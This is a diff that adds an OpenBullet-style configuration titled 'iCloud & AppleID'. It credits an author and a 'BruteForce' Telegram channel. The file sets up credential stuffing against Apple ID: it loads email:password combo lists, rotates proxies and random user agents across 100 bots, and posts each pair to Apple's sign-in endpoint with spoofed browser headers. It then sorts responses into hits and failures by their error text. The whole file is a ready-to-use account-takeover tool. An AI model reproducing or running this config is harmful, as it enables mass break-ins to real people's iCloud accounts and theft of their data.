@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "iCloud & AppleID",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-22T02:57:08.3511013+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | CPM Rate: 100_1000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#UserAgent FUNCTION GetRandomUA -> VAR "UserAgent" 
+
+#Post REQUEST POST "https://idmsa.apple.com/appleauth/auth/signin" 
+  CONTENT "{\"accountName\":\"<USER>\",\"rememberMe\":false,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <UserAgent>" 
+  HEADER "X-Apple-Locale: US-EN" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Apple-Trusted-Domain: https://idmsa.apple.com" 
+  HEADER "Origin: https://idmsa.apple.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://idmsa.apple.com/appleauth/auth/signin?widgetKey=92f19b477c5c9be6ab17f3ec2b1b2b7db4d00a9a8c973e3d6c90dac08b91de71&language=US-EN&iframeId=daw-19c26f82-b62c-457b-bdde-57d28cda5218&appId=632" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your Apple ID or password was incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Sorry, could not complete request because" 
+
